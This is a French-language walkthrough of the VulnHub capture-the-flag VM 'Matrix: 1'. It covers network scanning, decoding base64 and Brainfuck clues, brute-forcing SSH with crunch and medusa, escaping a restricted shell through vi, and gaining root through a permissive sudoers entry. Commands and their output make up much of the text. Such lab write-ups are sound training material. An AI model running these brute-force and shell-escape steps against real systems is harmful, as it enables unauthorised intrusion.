# Matrix: 1

[Matrix: 1](https://www.vulnhub.com/entry/matrix-1,259/) est une machine virtuelle vulnérable, conçue par [Ajay Verma](https://twitter.com/@unknowndevice64) au mois d'août 2018 et publiée sur VulnHub en novembre de la même année. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...

## Recherche d'informations

Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Matrix : il s'agit de 192.168.56.101.

```console
root@blinils:~# netdiscover -r 192.168.56.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts
3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
_____________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
192.168.56.1    0a:00:27:00:00:10      1      60  Unknown vendor
192.168.56.100  08:00:27:38:27:38      1      60  PCS Systemtechnik GmbH
192.168.56.101  08:00:27:e5:b2:aa      1      60  PCS Systemtechnik GmbH
```

Toute phase d'attaque commence par une analyse du système cible. Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi notamment possible de se connecter à distance avec SSH (port 22) au serveur Matrix ; deux serveurs Web (Python / SimpleHTTPServer) sont par ailleurs installés, respectivement sur les ports 80 et 31337.

```console
root@blinils:~# nmap -sT -sV -p- 192.168.56.101
Nmap scan report for 192.168.56.101
Host is up (0.0014s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)
80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
MAC Address: 08:00:27:E5:B2:AA (Oracle VirtualBox virtual NIC)
```

## Chasse au trésor : base64 et Brainfuck

C'est parti, la première page Web sur le port 80 s'intitule « _Welcome in Matrix_ » et nous invite, comme dans le film éponyme, à descendre avec le lapin blanc au fond du gouffre. À noter la présence d'un compte à rebours avant la date du 17/10/2018 (zut, trop tard !) et de l'image d'un tout petit-petit-lapin en bas de page. Le nom de l'image ```p0rt_31337.png``` donne un indice précieux pour la suite du CTF ; au cas où notre scan nmap n'aurait pas été exhaustif. Inutile donc de s'attarder sur le port 80 à la recherche d'une éventuelle vulnérabilité Web, ou d'informations supplémentaires.

![Affichage de l'image Matrix.png](Matrix.png)

La deuxième page Web sur le port 31337 s'intitule elle aussi « _Welcome in Matrix_ », mais diffère légèrement de la première. Outre la citation de Cypher, l'un des protagonistes du film, on remarque dans le code source un élément en base64 qui, une fois traduit, donne ```echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix``` en texte clair.

```html
<!-- service -->
<div class="service">
	<!--p class="service__text">ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGU
	gc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=</p-->
</div><!-- End / service -->
```

Encore une autre citation du film, et il semblerait qu'elle ait été stockée dans le fichier ```Cypher.matrix```.

```console
root@blinils:~# curl http://192.168.56.101:31337/Cypher.matrix
+++++ ++++[ ->+++ +++++ +<]>+ +++++ ++.<+ +++[- >++++ <]>++ ++++. +++++
+.<++ +++++ ++[-> ----- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]> +++.-
-.<++ +[->+ ++<]> ++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- --.<+
+++++ ++[-> +++++ +++<] >++++ +.+++ +++++ +.+++ +++.< +++[- >---< ]>---
---.< +++[- >+++< ]>+++ +.<++ +++++ ++[-> ----- ----< ]>-.< +++++ +++[-
>++++ ++++< ]>+++ +++++ +.+++ ++.++ ++++. ----- .<+++ +++++ [->-- -----
-<]>- ----- ----- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ +.<++
+[->- --<]> ---.< ++++[ ->+++ +<]>+ ++.-- .---- ----- .<+++ [->++ +<]>+
+++++ .<+++ +++++ +[->- ----- ---<] >---- ---.< +++++ +++[- >++++ ++++<
]>+.< ++++[ ->+++ +<]>+ +.<++ +++++ ++[-> ----- ----< ]>--. <++++ ++++[
->+++ +++++ <]>++ +++++ .<+++ [->++ +<]>+ ++++. <++++ [->-- --<]> .<+++
[->++ +<]>+ ++++. +.<++ +++++ +[->- ----- --<]> ----- ---.< +++[- >---<
]>--- .<+++ +++++ +[->+ +++++ +++<] >++++ ++.<+ ++[-> ---<] >---- -.<++
+[->+ ++<]> ++.<+ ++[-> ---<] >---. <++++ ++++[ ->--- ----- <]>-- -----
-.<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ +.<++ +[->- --<]> -----
-.<++ ++[-> ++++< ]>++. .++++ .---- ----. +++.< +++[- >---< ]>--- --.<+
+++++ ++[-> ----- ---<] >---- .<+++ +++++ [->++ +++++ +<]>+ +++++ +++++
.<+++ ++++[ ->--- ----< ]>--- ----- -.<++ +++++ [->++ +++++ <]>++ +++++
+++.. <++++ +++[- >---- ---<] >---- ----- --.<+ +++++ ++[-> +++++ +++<]
>++.< +++++ [->-- ---<] >-..< +++++ +++[- >---- ----< ]>--- ----- ---.-
--.<+ +++++ ++[-> +++++ +++<] >++++ .<+++ ++[-> +++++ <]>++ +++++ +.+++
++.<+ ++[-> ---<] >---- --.<+ +++++ [->-- ----< ]>--- ----. <++++ +[->-
----< ]>-.< +++++ [->++ +++<] >++++ ++++. <++++ +[->+ ++++< ]>+++ +++++
+.<++ ++[-> ++++< ]>+.+ .<+++ +[->- ---<] >---- .<+++ [->++ +<]>+ +..<+
++[-> +++<] >++++ .<+++ +++++ [->-- ----- -<]>- ----- ----- --.<+ ++[->
---<] >---. <++++ ++[-> +++++ +<]>+ ++++. <++++ ++[-> ----- -<]>- ----.
<++++ ++++[ ->+++ +++++ <]>++ ++++. +++++ ++++. +++.< +++[- >---< ]>--.
--.<+ ++[-> +++<] >++++ ++.<+ +++++ +++[- >---- ----- <]>-- -.<++ +++++
+[->+ +++++ ++<]> +++++ +++++ ++.<+ ++[-> ---<] >--.< ++++[ ->+++ +<]>+
+.+.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++
+.+++ .---- ----. <++++ ++++[ ->--- ----- <]>-- ----- ----- ---.< +++++
+++[- >++++ ++++< ]>+++ .++++ +.--- ----. <++++ [->++ ++<]> +.<++ ++[->
----< ]>-.+ +.<++ ++[-> ++++< ]>+.< +++[- >---< ]>--- ---.< +++[- >+++<
]>+++ +.+.< +++++ ++++[ ->--- ----- -<]>- -.<++ +++++ ++[-> +++++ ++++<
]>++. ----. <++++ ++++[ ->--- ----- <]>-- ----- ----- ---.< +++++ +[->+
+++++ <]>++ +++.< +++++ +[->- ----- <]>-- ---.< +++++ +++[- >++++ ++++<
]>+++ +++++ .---- ---.< ++++[ ->+++ +<]>+ ++++. <++++ [->-- --<]> -.<++
+++++ +[->- ----- --<]> ----- .<+++ +++++ +[->+ +++++ +++<] >+.<+ ++[->
---<] >---- .<+++ [->++ +<]>+ +.--- -.<++ +[->- --<]> --.++ .++.- .<+++
+++++ [->-- ----- -<]>- ---.< +++++ ++++[ ->+++ +++++ +<]>+ +++++ .<+++
[->-- -<]>- ----. <+++[ ->+++ <]>++ .<+++ [->-- -<]>- --.<+ +++++ ++[->
----- ---<] >---- ----. <++++ +++[- >++++ +++<] >++++ +++.. <++++ +++[-
>---- ---<] >---- ---.< +++++ ++++[ ->+++ +++++ +<]>+ ++.-- .++++ +++.<
+++++ ++++[ ->--- ----- -<]>- ----- --.<+ +++++ +++[- >++++ +++++ <]>++
+++++ +.<++ +[->- --<]> -.+++ +++.- --.<+ +++++ +++[- >---- ----- <]>-.
<++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ .++++ +++++ .<+++ +[->- ---<]
>--.+ +++++ ++.<+ +++++ ++[-> ----- ---<] >---- ----- --.<+ +++++ ++[->
+++++ +++<] >+.<+ ++[-> +++<] >++++ .<+++ [->-- -<]>- .<+++ +++++ [->--
----- -<]>- ---.< +++++ +++[- >++++ ++++< ]>+++ +++.+ ++.++ +++.< +++[-
>---< ]>-.< +++++ +++[- >---- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]>
+++.< +++[- >+++< ]>+++ .+++. .<+++ [->-- -<]>- ---.- -.<++ ++[-> ++++<
]>+.< +++++ ++++[ ->--- ----- -<]>- --.<+ +++++ +++[- >++++ +++++ <]>++
.+.-- .---- ----- .++++ +.--- ----. <++++ ++++[ ->--- ----- <]>-- -----
.<+++ +++++ [->++ +++++ +<]>+ +++++ +++++ ++++. ----- ----. <++++ ++++[
->--- ----- <]>-- ----. <++++ ++++[ ->+++ +++++ <]>++ +++++ +++++ ++++.
<+++[ ->--- <]>-- ----. <++++ [->++ ++<]> ++..+ +++.- ----- --.++ +.<++
+[->- --<]> ----- .<+++ ++++[ ->--- ----< ]>--- --.<+ ++++[ ->--- --<]>
----- ---.- --.<
```

Il s'agit d'une portion de code en [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck) qui, [une fois décodée](https://www.dcode.fr/langage-brainfuck), donne le texte suivant :

```console
You can enter into matrix as guest, with password k1ll0rXX

Note: Actually, I forget last two characters so I have replaced
with XX try your luck and find correct string of password.
```

## Génération de wordlists avec Crunch et attaque avec Medusa

Cela signifie qu'il va falloir tester un grand nombre de combinaisons, XX pouvant être des caractères majuscules, minuscules, spéciaux ou des chiffres. Pour cela, le générateur de wordlists [__Crunch__](https://tools.kali.org/password-attacks/crunch) est particulièrement adapté !

```console
root@blinils:~# crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -t k1ll0r@@ > login.db
Crunch will now generate the following amount of data: 81225 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 9025
```

Le charset choisi, ```mixalpha-numeric-all-space```, correspond aux 95 caractères suivants : ```abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ 0123456789 !@#$%^&*()- _+=~\`[]{}|:;"'<>,.?/``` espace typographique comprise, soit un total de 95 x 95 = 9025 combinaisons possibles. Plutôt que de toutes les tester à la main, l'outil [__Medusa__](http://foofus.net/goons/jmk/medusa/medusa.html) va automatiser cette [attaque par dictionnaire](https://repo.zenk-security.com/Reversing%20.%20cracking/Cracking_Passwords_Guide.pdf).

```console
root@blinils:~# medusa -h 192.168.56.101 -u guest -P login.db -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0raa (1 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rab (2 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rac (3 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rad (4 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rae (5 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0raf (6 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rag (7 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rah (8 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0rai (9 of 9025 complete)
--snip--
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0r7k (5616 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0r7l (5617 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0r7m (5618 of 9025 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (1 of 1, 0 complete) Password: k1ll0r7n (5619 of 9025 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: guest Password: k1ll0r7n [SUCCESS]
```

Victoire ! Nous pouvons nous connecter au serveur avec les credentials ```guest:k1ll0r7n``` !

```console
root@blinils:~# ssh guest@192.168.56.101
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ECDSA key fingerprint is SHA256:BMhLOBAe8UBwzvDNexM7vC3gv9ytO1L8etgkkIL8Ipk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.
guest@192.168.56.101's password: 
Last login: Mon Aug  6 16:25:44 2018 from 192.168.56.102
guest@porteus:~$ 
```

## Évasion d'un shell restreint et variable d'environnement PATH

Manque de chance, il s'agit d'un [shell restreint](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (_restricted shell_). Contrairement aux shells habituels, plusieurs restrictions sont mises en place ; citons par exemple l'interdiction de changer de répertoire courant avec la commande ```cd```, l'interdiction de modifier les variables d'environnement ```SHELL```, ```PATH```, ```ENV``` et ```BASH_ENV``` ou encore l'interdiction d'appeler des commandes contenant ```/``` la barre oblique.

```console
guest@porteus:~$ cd /etc
-rbash: cd: restricted

guest@porteus:~$ ls -al
-rbash: /bin/ls: restricted: cannot specify '/' in command names

guest@porteus:~$ sudo
-rbash: sudo: command not found

guest@porteus:~$ /usr/bin/sudo -l
-rbash: /usr/bin/sudo: restricted: cannot specify '/' in command names

guest@porteus:~$ w; whoami; id; uname;
-rbash: w: command not found
-rbash: whoami: command not found
-rbash: id: command not found
-rbash: uname: command not found
```

L'article [_Escaping Restricted Linux Shells_](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells) posté sur le site du SANS Institute par Doug Stilwell donne une astuce très précieuse : il est possible d'obtenir un shell à partir d'un éditeur de texte tel que ```vi``` ou ```vim```. Ça tombe bien, vi est l'un des seuls binaires que l'on peut appeler sur notre shell restreint. Une fois à l'intérieur de l'éditeur, la commande ```:!/bin/bash``` nous permet d'obtenir un shell digne de ce nom !

```console
guest@porteus:~$ vi

--snip--

:!/bin/bash

--snip--

~

bash: grep: command not found
bash: ps: command not found
bash: ps: command not found
bash: ps: command not found
bash: ps: command not found
bash: ps: command not found
bash: ps: command not found

guest@porteus:~$ ls
Desktop/  Documents/  Downloads/  Music/  Pictures/  Public/  Videos/  prog/

guest@porteus:~$ cd prog

guest@porteus:~/prog$ ls -al
total 8
drwxr-xr-x  2 guest users 4096 Aug  6 11:00 ./
drwxr-xr-x 18 guest users 4096 Nov  4 11:30 ../
lrwxrwxrwx  1 guest users   11 Aug  6 11:00 vi -> /usr/bin/vi*

guest@porteus:~/prog$
```

C'est quand même plus sympa pour poursuivre et finir ce CTF ! Peu d'alias ont été créés dans le fichier ```.bashrc``` et la variable d'environnement ```$PATH``` est quasi-vide ; il est nécessaire de spécifier à chaque fois le chemin absolu des binaires appelés.

```console
guest@porteus:~$ echo $0
/bin/bash

guest@porteus:~$ echo $PATH
/home/guest/prog

guest@porteus:~$ /usr/bin/head -n4 .bashrc
# Setup color scheme <brokenman> for list call
alias ll='/bin/ls --color=auto -lF'
alias la='/bin/ls --color=auto -axF'
alias ls='/bin/ls --color=auto -xF'

guest@porteus:~$ uname -r
bash: uname: command not found

guest@porteus:~$ /usr/bin/uname -r
4.16.3-porteus
```

La solution de facilité consiste à ajouter les chemins qui vont bien à la variable d'environnement ```PATH```.

```console
guest@porteus:~$ export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

guest@porteus:~$ uname -r
4.16.3-porteus
```

## Mauvaise gestion des privilèges d'administration via le fichier /etc/sudoers

```console
guest@porteus:~$ sudo -l
User guest may run the following commands on porteus:
    (ALL) ALL
    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
    (trinity) NOPASSWD: /bin/cp
```

Dommage, tout comme la [VM W1R3S: 1.0.1](/CTF-VulnLabs/w1r3s), la fin de ce CTF est une formalité. L'utilisateur guest est autorisé à exécuter toutes les commandes via sudo, on peut alors passer root avec la commande ```sudo su``` et le tour est joué.

```console
guest@porteus:~$ /usr/bin/sudo su root

root@porteus:/home/guest# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

root@porteus:/home/guest# wc -c /root/flag.txt
691 /root/flag.txt
```

## Conclusion

La première partie de ce CTF ressemblait davantage à une chasse au trésor, et n'est pas représentative de ce qu'on pourrait trouver en pentest (encore que...), la diversité des challenges était néanmoins sympa. À moins de n'avoir sauté une étape, le compte utilisateur ```trinity``` n'entre en rien dans la résolution du CTF, ce qui est dommage ; une étape intermédiaire aurait été la bienvenue. Idem pour l'élévation de privilèges, le ```sudo su root``` est assez simple à trouver et à exploiter. Cela dit, la VM aux couleurs de Matrix et l'idée du _restricted shell_ étaient très chouettes. Merci beaucoup à [Ajay Verma](https://twitter.com/@unknowndevice64) pour la création de cette VM !
